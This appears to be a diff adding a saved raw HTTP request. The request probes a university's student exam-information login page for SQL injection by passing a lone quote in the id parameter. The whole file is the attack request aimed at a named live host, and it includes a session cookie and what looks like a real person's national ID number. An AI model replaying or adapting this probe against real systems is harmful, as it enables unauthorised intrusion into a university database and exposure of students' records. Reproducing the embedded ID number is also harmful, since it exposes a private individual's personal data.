@@ -1,0 +1,15 @@
+POST /stud_exam_info/login.aspx?id=%27 HTTP/1.1
+Host: tdb2.tanta.edu.eg
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 474
+Origin: http://tdb2.tanta.edu.eg
+Connection: close
+Referer: http://tdb2.tanta.edu.eg/stud_exam_info/login.aspx?id=%27
+Cookie: ASP.NET_SessionId=gpay5ik3m2ixzd1qpdiz4bpq
+Upgrade-Insecure-Requests: 1
+
+__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTkwMzkwNDY5OQ9kFgICAw9kFgQCAQ8PFgIeCEltYWdlVXJsBSBhc3NldHMvaW1hZ2VzL0ZhY3VsdHlfTG9nby8nLnBuZ2RkAgkPZBYCAgEPDxYCHgRUZXh0ZWRkZKVQCO2ZJMkZRfY2vzV0mT1bWh2n366RWtTIWJ%2FyAAqe&__VIEWSTATEGENERATOR=E449712F&__EVENTVALIDATION=%2FwEdAANT5x1Jz%2FY8MZ02eo1Ss2Jcv0XRZjMNgvtaYWoL6U8sBNXsTufrvLmloyXZIcXRo6kKhf%2B1pk9%2F86GumpurZ2izOMBiFh7zdK86x%2FzYfC%2BUgA%3D%3D&txtNamtionalNumber=29905191600456&btnVerify=%D8%AF%D8%AE%D9%88%D9%84
